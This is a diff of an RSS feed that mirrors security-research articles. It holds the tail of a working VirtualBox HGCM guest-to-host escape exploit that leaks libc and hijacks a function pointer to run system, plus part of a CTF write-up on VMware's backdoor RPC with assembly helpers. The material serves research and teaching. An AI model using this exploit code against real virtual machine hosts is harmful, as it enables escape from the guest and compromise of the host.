+        &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;leak2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hgcm_call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SHCRGL_GUEST_FN_WRITE_READ_BUFFERED&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x43434343&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;A&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x290&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x290&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unpack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;leak2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;#self.read(self.pConn ,0x200, canfail= True)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)):&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;hgcm_disconnect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;crVBoxHGCMFree&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pConn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OFFSET_CONN_FREE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;canfail&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;[*] Leaked crVBoxHGCMFree @ 0x&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%016x&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;crVBoxHGCMFree&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;crVBoxHGCMFree&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;crVBoxHGCMFree_off&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vbox_puts_off&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;canfail&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc_puts_off&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc_system_off&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;[*] Leaked system @ 0x&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%016x&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;/snap/bin/gnome-calculator&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;&lt;/span&gt;
+        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pConn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x128&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pConn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;hgcm_disconnect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;vm&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;__main__&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Pwn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;#if raw_input(&#39;you want RIP control? [y/n] &#39;).startswith(&#39;y&#39;):&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;#    p.rip(0xdeadbeef)&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-c45b1eb6932357c41f833d98d087058b_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1690&quot; data-rawheight=&quot;894&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1690&quot; data-original=&quot;https://pic4.zhimg.com/v2-c45b1eb6932357c41f833d98d087058b_r.jpg&quot;&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-c45b1eb6932357c41f833d98d087058b_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1690&quot; data-rawheight=&quot;894&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1690&quot; data-original=&quot;https://pic4.zhimg.com/v2-c45b1eb6932357c41f833d98d087058b_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-c45b1eb6932357c41f833d98d087058b_b.jpg&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;b&gt;其他相关链接&lt;/b&gt;&lt;/p&gt;&lt;a href=&quot;http://link.zhihu.com/?target=https%3A//drive.google.com/file/d/1IuRvlqWiZp7UhGN4BPifRS-NTDk5xdrd/view%3Fusp%3Dsharing&quot; data-draft-node=&quot;block&quot; data-draft-type=&quot;link-card&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;题目附件&lt;/a&gt;&lt;a href=&quot;http://link.zhihu.com/?target=https%3A//phoenhex.re/2018-07-27/better-slow-than-sorry&quot; data-draft-node=&quot;block&quot; data-draft-type=&quot;link-card&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;Better slow than sorry - VirtualBox 3D acceleration considered harmful&lt;/a&gt;&lt;p&gt;&lt;/p&gt;</description>
+<author>婴宁</author>
+<guid isPermaLink="false">2019-03-11-58910752</guid>
+<pubDate>Mon, 11 Mar 2019 00:00:00 +0800</pubDate>
+</item>
 <item>
 <title>从概念到落地：“伪装者”产品的成熟之路</title>
 <link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2019-03-04-58232413.html</link>
@@ -1836,665 +2269,6 @@ f:close()
 <author>婴宁</author>
 <guid isPermaLink="false">2018-12-26-53329563</guid>
 <pubDate>Wed, 26 Dec 2018 00:00:00 +0800</pubDate>
-</item>
-<item>
-<title>Real World CTF 2018 Finals Station-Escape Writeup</title>
-<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-12-11-52140921.html</link>
-<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/52140921&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
-&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-109690a7eff1cc6e46d439e585195c5c_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;by r3kapig&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;blockquote&gt;RWCTF Final是我们觉得非常不错的一次竞赛，非常贴近实战，其中每道题目都值得深入研究。其中Station-Escape是一道VMWare Workstation逃逸的题目，我们觉得非常cool，所以进行了详细分析，这里非常感谢&lt;b&gt;长亭科技&lt;/b&gt;的&lt;b&gt;flyyy&lt;/b&gt;师傅贡献的非常优秀的题目和悉心的技术指导。本文分析工作由&lt;b&gt;r3kapig&lt;/b&gt;的&lt;b&gt;Ne0&lt;/b&gt;和&lt;b&gt;bibi&lt;/b&gt;完成。&lt;/blockquote&gt;&lt;h2&gt;前置知识&lt;/h2&gt;&lt;p&gt;在VMWare中，有一个奇特的攻击面，就是vmtools。vmtools帮助宿主机和客户机完成包括文件传输在内的一系列的通信和交互，其中使用了一种被称为backdoor的接口。backdoor接口是如何和宿主机进行通信的呢，我们观察backdoor函数的实现，可以发现如下代码：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
-MOV EAX, 564D5868h                      /* magic number     */
-MOV EBX, command-specific-parameter
-MOV CX,  backdoor-command-number
-MOV DX,  5658h                          /* VMware I/O Port  */
-
-IN  EAX, DX (or OUT DX, EAX)
-&lt;/code&gt;&lt;p&gt;首先需要明确的是，该接口在用户态就可以使用。在通常环境下，IN指令是一条特权指令，在普通用户态程序下是无法使用的。因此，运行这条指令会让用户态程序出错并陷出到hypervisor层，从而hypervisor层可以对客户机进行相关的操作和处理，因此利用此机制完成了通信。利用backdoor的通信机制，客户机便可以使用RPC进行一系列的操作，例如拖放、复制、获取信息、发送信息等等。&lt;/p&gt;&lt;p&gt;backdoor机制所有的命令和调用方法，基本都是首先设置寄存器、然后调用IN或OUT特权指令的模式。那么我们使用backdoor传输RPC指令需要经过哪些步骤呢？我们以本题涉及到的backdoor操作进行说明：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;+------------------+
-     | Open RPC channel |
-     +---------+--------+
-               |
-  +------------v-----------+
-  | Send RPC command length|
-  +------------+-----------+
-               |
-  +------------v-----------+
-  | Send RPC command data  |
-  +------------+-----------+
-               |
- +-------------v------------+
- | Recieve RPC reply length |
- +-------------+------------+
-               |
-  +------------v-----------+
-  | Receive RPC reply data |
-  +------------+-----------+
-               |
-+--------------v-------------+
-| Finish receiving RPC reply |
-+--------------+-------------+
-               |
-     +---------v---------+
-     | Close RPC channel |
-     +-------------------+&lt;/code&gt;&lt;blockquote&gt;以下内容主要参考（该文档和真实逆向情况略有出入，将会在后文中说明）：&lt;a href=&quot;https://sites.google.com/site/chitchatvmback/backdoor&quot;&gt;https://sites.google.com/site/chitchatvmback/backdoor&lt;/a&gt;&lt;/blockquote&gt;&lt;h2&gt;Open RPC channel&lt;/h2&gt;&lt;blockquote&gt;RPC subcommand：00h&lt;/blockquote&gt;&lt;p&gt;调用IN（OUT）前，需要设置的寄存器内容：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
-EAX = 564D5868h - magic number
-EBX = 49435052h - RPC open magic number (&#39;RPCI&#39;)
-ECX(HI) = 0000h - subcommand number
-ECX(LO) = 001Eh - command number
-EDX(LO) = 5658h - port number
-&lt;/code&gt;&lt;p&gt;返回值：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
-ECX = 00010000h: success / 00000000h: failure
-EDX(HI) = RPC channel number&lt;/code&gt;&lt;p&gt;该功能用于打开RPC的channel，其中ECX会返回是否成功，EDX返回值会返回一个channel的编号，在后续的RPC通信中，将使用该编号。这里需要注意的是，在单个虚拟机中只能同时使用8个channel（&lt;code class=&quot;inline&quot;&gt;#0 - #7&lt;/code&gt;）,当尝试打开第9个channel的时候，会检查其他channel的打开时间，如果时间过了某一个值，会将超时的channel关闭，再把这个channel的编号返回；如果都没有超时，create channel会失败。&lt;/p&gt;&lt;p&gt;我们可以使用如下函数实现Open RPC channel的过程：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
-void channel_open(int *cookie1,int *cookie2,int *channel_num,int *res){
-	 asm(&quot;movl %%eax,%%ebx\n\t&quot;
-                &quot;movq %%rdi,%%r10\n\t&quot;
-                &quot;movq %%rsi,%%r11\n\t&quot;
-                &quot;movq %%rdx,%%r12\n\t&quot;
-		&quot;movq %%rcx,%%r13\n\t&quot;
-                &quot;movl $0x564d5868,%%eax\n\t&quot;
-                &quot;movl $0xc9435052,%%ebx\n\t&quot;
-                &quot;movl $0x1e,%%ecx\n\t&quot;
-                &quot;movl $0x5658,%%edx\n\t&quot;
-                &quot;out %%eax,%%dx\n\t&quot;
-                &quot;movl %%edi,(%%r10)\n\t&quot;
-                &quot;movl %%esi,(%%r11)\n\t&quot;
-                &quot;movl %%edx,(%%r12)\n\t&quot;
-		&quot;movl %%ecx,(%%r13)\n\t&quot;
-		:
-                :
-                :&quot;%rax&quot;,&quot;%rbx&quot;,&quot;%rcx&quot;,&quot;%rdx&quot;,&quot;%rsi&quot;,&quot;%rdi&quot;,&quot;%r8&quot;,&quot;%r10&quot;,&quot;%r11&quot;,&quot;%r12&quot;,&quot;%r13&quot;
-        );
-}
-&lt;/code&gt;&lt;h2&gt;Send RPC command length&lt;/h2&gt;&lt;blockquote&gt;RPC subcommand：01h&lt;/blockquote&gt;&lt;p&gt;调用：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
-EAX = 564D5868h - magic number
-EBX = command length (not including the terminating NULL)
-ECX(HI) = 0001h - subcommand number
-ECX(LO) = 001Eh - command number
-EDX(HI) = channel number
-EDX(LO) = 5658h - port number
-&lt;/code&gt;&lt;p&gt;返回值：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
-ECX = 00810000h: success / 00000000h: failure
-&lt;/code&gt;&lt;p&gt;在发送RPC command前，需要先发送RPC command的长度，需要注意的是，此时我们输入的channel number所指向的channel必须处于已经open的状态。ECX会返回是否成功发送。具体实现如下：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
-void channel_set_len(int cookie1,int cookie2,int channel_num,int len,int *res){
-	asm(&quot;movl %%eax,%%ebx\n\t&quot;
-		&quot;movq %%r8,%%r10\n\t&quot;
-                &quot;movl %%ecx,%%ebx\n\t&quot;
-                &quot;movl $0x564d5868,%%eax\n\t&quot;
-                &quot;movl $0x0001001e,%%ecx\n\t&quot;
-                &quot;movw $0x5658,%%dx\n\t&quot;
-                &quot;out %%eax,%%dx\n\t&quot;
-                &quot;movl %%ecx,(%%r10)\n\t&quot;
-                :
-                :
-        	:&quot;%rax&quot;,&quot;%rbx&quot;,&quot;%rcx&quot;,&quot;%rdx&quot;,&quot;%rsi&quot;,&quot;%rdi&quot;,&quot;%r10&quot;
-	);
-}
-&lt;/code&gt;&lt;h2&gt;Send RPC command data&lt;/h2&gt;&lt;blockquote&gt;RPC subcommand：02h&lt;/blockquote&gt;&lt;p&gt;调用：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
-EAX = 564D5868h - magic number
-EBX = 4 bytes from the command data (the first byte in LSB)
-ECX(HI) = 0002h - subcommand number
-ECX(LO) = 001Eh - command number
-EDX(HI) = channel number
-EDX(LO) = 5658h - port number
-&lt;/code&gt;&lt;p&gt;返回值:&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
-ECX = 000010000h: success / 00000000h: failure
-&lt;/code&gt;&lt;p&gt;该功能必须在Send RPC command length后使用,每次只能发送4个字节。例如，如果要发送命令&lt;code class=&quot;inline&quot;&gt;machine.id.get&lt;/code&gt;，那么必须要调用4次，分别为：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
-EBX set to 6863616Dh (&quot;mach&quot;)
-EBX set to 2E656E69h (&quot;ine.&quot;)
-EBX set to 672E6469h (&quot;id.g&quot;)
-EBX set to 00007465h (&quot;et\x00\x00&quot;)
-&lt;/code&gt;&lt;p&gt;ECX会返回是否成功，具体实现如下：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
-void channel_send_data(int cookie1,int cookie2,int channel_num,int len,char *data,int *res){
-	asm(&quot;pushq %%rbp\n\t&quot;
-                &quot;movq %%r9,%%r10\n\t&quot;
-		&quot;movq %%r8,%%rbp\n\t&quot;
-		&quot;movq %%rcx,%%r11\n\t&quot;
-		&quot;movq $0,%%r12\n\t&quot;
-		&quot;1:\n\t&quot;
-		&quot;movq %%r8,%%rbp\n\t&quot;
-		&quot;add %%r12,%%rbp\n\t&quot;
-		&quot;movl (%%rbp),%%ebx\n\t&quot;
-                &quot;movl $0x564d5868,%%eax\n\t&quot;
-                &quot;movl $0x0002001e,%%ecx\n\t&quot;
-		&quot;movw $0x5658,%%dx\n\t&quot;
-                &quot;out %%eax,%%dx\n\t&quot;
-		&quot;addq $4,%%r12\n\t&quot;
-		&quot;cmpq %%r12,%%r11\n\t&quot;
-		&quot;ja 1b\n\t&quot;
-		&quot;movl %%ecx,(%%r10)\n\t&quot;
-		&quot;popq %%rbp\n\t&quot;
-                :
-                :
-                :&quot;%rax&quot;,&quot;%rbx&quot;,&quot;%rcx&quot;,&quot;%rdx&quot;,&quot;%rsi&quot;,&quot;%rdi&quot;,&quot;%r10&quot;,&quot;%r11&quot;,&quot;%r12&quot;
-        );
-}
-&lt;/code&gt;&lt;h2&gt;Recieve RPC reply length&lt;/h2&gt;&lt;blockquote&gt;RPC subcommand：03h&lt;/blockquote&gt;&lt;p&gt;调用：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
-EAX = 564D5868h - magic number
-ECX(HI) = 0003h - subcommand number
-ECX(LO) = 001Eh - command number
-EDX(HI) = channel number
-EDX(LO) = 5658h - port number
-&lt;/code&gt;&lt;p&gt;返回值：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
-EBX = reply length (not including the terminating NULL)
-ECX = 00830000h: success / 00000000h: failure
-&lt;/code&gt;&lt;p&gt;接收RPC reply的长度。需要注意的是所有的RPC command都会返回至少2个字节的reply的数据，其中&lt;code class=&quot;inline&quot;&gt;1&lt;/code&gt;表示&lt;code class=&quot;inline&quot;&gt;success&lt;/code&gt;,&lt;code class=&quot;inline&quot;&gt;0&lt;/code&gt;表示&lt;code class=&quot;inline&quot;&gt;failure&lt;/code&gt;，即使VMware无法识别RPC command，也会返回&lt;code class=&quot;inline&quot;&gt;0 Unknown command&lt;/code&gt;作为reply。也就是说，reply数据的前两个字节始终表示RPC command命令的状态。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
-void channel_recv_reply_len(int cookie1,int cookie2,int channel_num,int *len,int *res){
-	asm(&quot;movl %%eax,%%ebx\n\t&quot;
-                &quot;movq %%r8,%%r10\n\t&quot;
-                &quot;movq %%rcx,%%r11\n\t&quot;
-                &quot;movl $0x564d5868,%%eax\n\t&quot;
-                &quot;movl $0x0003001e,%%ecx\n\t&quot;
-                &quot;movw $0x5658,%%dx\n\t&quot;
-                &quot;out %%eax,%%dx\n\t&quot;
-                &quot;movl %%ecx,(%%r10)\n\t&quot;
-		&quot;movl %%ebx,(%%r11)\n\t&quot;
-                :
-                :
-                :&quot;%rax&quot;,&quot;%rbx&quot;,&quot;%rcx&quot;,&quot;%rdx&quot;,&quot;%rsi&quot;,&quot;%rdi&quot;,&quot;%r10&quot;,&quot;%r11&quot;
-        );
-		
-}
-&lt;/code&gt;&lt;h2&gt;Receive RPC reply data&lt;/h2&gt;&lt;blockquote&gt;RPC subcommand：04h&lt;/blockquote&gt;&lt;p&gt;调用：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
-EAX = 564D5868h - magic number
-EBX = reply type from subcommand 03h
-ECX(HI) = 0004h - subcommand number
-ECX(LO) = 001Eh - command number
-EDX(HI) = channel number
-EDX(LO) = 5658h - port number
-&lt;/code&gt;&lt;p&gt;返回：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
-EBX = 4 bytes from the reply data (the first byte in LSB)
-ECX = 00010000h: success / 00000000h: failure
-&lt;/code&gt;&lt;p&gt;和&lt;code class=&quot;inline&quot;&gt;https://sites.google.com/site/chitchatvmback/backdoor&lt;/code&gt;中有出入的是，在实际的逆向分析中，EBX中存放的值，不是reply id，而是reply type，他决定了执行的路径。和发送数据一样，每次只能够接受4个字节的数据。需要注意的是，我们在&lt;code class=&quot;inline&quot;&gt;Recieve RPC reply length&lt;/code&gt;中提到过，应答数据的前两个字节始终表示RPC command的状态。举例说明，如果我们使用RPC command询问&lt;code class=&quot;inline&quot;&gt;machine.id.get&lt;/code&gt;，如果成功的话，会返回&lt;code class=&quot;inline&quot;&gt;1 &amp;lt;virtual machine id&amp;gt;&lt;/code&gt;，否则为&lt;code class=&quot;inline&quot;&gt;0 No machine id&lt;/code&gt;。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
-void channel_recv_data(int cookie1,int cookie2,int channel_num,int offset,char *data,int *res){
-	asm(&quot;pushq %%rbp\n\t&quot;
-                &quot;movq %%r9,%%r10\n\t&quot;
-                &quot;movq %%r8,%%rbp\n\t&quot;
-                &quot;movq %%rcx,%%r11\n\t&quot;
-                &quot;movq $1,%%rbx\n\t&quot;
-		&quot;movl $0x564d5868,%%eax\n\t&quot;
-                &quot;movl $0x0004001e,%%ecx\n\t&quot;
-                &quot;movw $0x5658,%%dx\n\t&quot;
-                &quot;in %%dx,%%eax\n\t&quot;
-		&quot;add %%r11,%%rbp\n\t&quot;
-                &quot;movl %%ebx,(%%rbp)\n\t&quot;
-                &quot;movl %%ecx,(%%r10)\n\t&quot;
-                &quot;popq %%rbp\n\t&quot;
-                :
-                :
-                :&quot;%rax&quot;,&quot;%rbx&quot;,&quot;%rcx&quot;,&quot;%rdx&quot;,&quot;%rsi&quot;,&quot;%rdi&quot;,&quot;%r10&quot;,&quot;%r11&quot;,&quot;%r12&quot;
-        );
-}
-&lt;/code&gt;&lt;h2&gt;Finish receiving RPC reply&lt;/h2&gt;&lt;blockquote&gt;RPC subcommand：05h&lt;/blockquote&gt;&lt;p&gt;调用：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
-EAX = 564D5868h - magic number
-EBX = reply type from subcommand 03h
-ECX(HI) = 0005h - subcommand number
-ECX(LO) = 001Eh - command number
-EDX(HI) = channel number
-EDX(LO) = 5658h - port number
